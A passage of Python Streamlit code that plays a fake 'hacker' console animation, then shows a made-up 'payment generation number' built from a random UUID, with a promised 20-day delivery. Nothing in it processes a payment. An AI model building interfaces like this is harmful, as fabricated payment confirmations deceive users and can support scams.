        cmd_markup_accumulator += f"&gt; {specific_line}<br>"
        console_view.markdown(f"<div class='hacker-cmd-box'><p class='hacker-cmd-string'>{cmd_markup_accumulator}</p></div>", unsafe_allow_html=True)
        time.sleep(1.4)
        
    console_view.empty()
    
    st.success("✅ PRIORITY ROUTING CHANNELS DEPLOYED SUCCESSFULLY!")
    generated_payment_number = f"PMT-TK-{str(uuid.uuid4())[:10].upper()}"
    
    token_display_box = f"""
    <div style='text-align:center; padding:25px; background:#f0fdf4; border-radius:14px; border:2px solid #16a34a; margin:20px 0; box-shadow: 0 4px 15px rgba(22, 163, 74, 0.1);'>
        <h2 style='color:#16a34a; font-weight:800; margin:0 0 6px 0; font-size:18px;'>PAYMENT GENERATION NUMBER CLAIMED</h2>
        <code style='font-size:19px; font-weight:800; color:#1e293b; background:#ffffff; padding:6px 14px; border-radius:8px; border:2px solid #cbd5e1; font-family:monospace;'>{generated_payment_number}</code>
        <p style='margin:16px 0 0 0; font-size:14.5px; font-weight:700; color:#16a34a;'>🚀 Allocation Stream Priority: Active (Est Delivery Transit: 20 days)</p>
    </div>
    """
    st.markdown(token_display_box, unsafe_allow_html=True)
    
    if st.button("RESET CONTROL HANDSHAKE TERMINAL", type="primary", use_container_width=True):
        st.session_state.clear()
        st.rerun()
        
    st.markdown("</div>", unsafe_allow_html=True)


        
